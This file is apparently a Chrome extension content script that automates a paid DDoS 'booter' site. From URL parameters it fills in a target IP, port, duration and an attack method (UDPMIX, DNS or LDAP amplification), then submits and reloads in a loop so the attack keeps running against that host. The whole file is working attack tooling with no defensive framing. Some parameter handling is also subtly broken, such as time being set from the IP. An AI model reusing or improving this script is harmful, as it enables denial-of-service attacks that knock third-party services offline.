chrome.extension.sendMessage({}, function(response) {
	var readyStateCheckInterval = setInterval(function() {
		if (document.readyState === "complete") {
			clearInterval(readyStateCheckInterval);
			const urlParams = new URLSearchParams(window.location.search);
			chrome.runtime.sendMessage({subject: "settings"}, function(response) {
				if (urlParams.has("stopautoboot")) {
					$("body").append("<img src='" + chrome.extension.getURL('images/LoopAnim.gif') + "' id='StressLoopOverlay' ></img>");
					$("button:contains('Stop attack')").click();
					setTimeout(() => {
						top.location.href = chrome.extension.getURL("popup/popup.html");
					}, response.startDelay);
				}
				if (urlParams.has("autoboot")) {
					if (urlParams.has("port")) {
						var portName = urlParams.get("method");
					} else {
						var portName = 80;
					}
					if (urlParams.has("time")) {
						var timeName = urlParams.get("method");
					} else {
						var timeName = 240;
					}
					if (urlParams.has("method")) {
						if (urlParams.get("method") == 1) {
							var methodName = "UDPMIX";
						} else if (urlParams.get("method") == 2) {
							var methodName = "DNS";
						} else if (urlParams.get("method") == 3) {
							var methodName = "LDAP";
						}
					} else {
						var methodName = "UDPMIX";
					}
					$("body").append("<img src='" + chrome.extension.getURL('images/LoopAnim.gif') + "' id='StressLoopOverlay' ></img>");
					$("body").append(`<div id='StressLoopOverlayOverlay'><h1>Booting: ${urlParams.get("ip")}!</h1><h2>Every: ${timeName} Seconds!</h2><h2>Checking Every: ${response.refDelay / 1000} Seconds!</h2><h2>On Port: ${portName}!</h2><h2 >Using Method: ${methodName}!</h2><button onclick='top.location.href="https://www.stressthem.to/booter?stopautoboot";'>Stop Loop And Finish</button></div>`);
					if (urlParams.has("ip")) {
						if ($("td.green").length) {
							setTimeout(() => {
								location.reload();
							}, response.refDelay);
						} else {
							$("[name|=\"host\"]").typetype(urlParams.get("ip"), {
								e: 0,
								t:0
							});
							if (urlParams.has("method")) {
								$('select>option:eq(' + urlParams.get("method") + ')').prop('selected', true);
							} else {
								$('select>option:eq(1)').prop('selected', true);
							}
							if (urlParams.has("port")) {
								$("[name|=\"port\"]").typetype(urlParams.get("port"), {
									e: 0,
									t: 0
								});
							} else {
								$("[name|=\"port\"]").typetype("80", {
									e: 0,
									t: 0
								});
							}
							if (urlParams.has("time")) {
								$("[name|=\"time\"]").typetype(urlParams.get("ip"), {
									e: 0,
									t: 0
								});
							} else {
								$("[name|=\"time\"]").typetype("240", {
									e: 0,
									t: 0
								});
							}
							setTimeout(() => {
								$(".jssubmit").click();	
								setTimeout(() => {
									location.reload();
								}, response.startDelay);
							}, response.clickDelay);
						}
						
					} else {
						alert("REQUIRES IP!");
					}
					
				}
			});
			
		}
	}, 10);
});
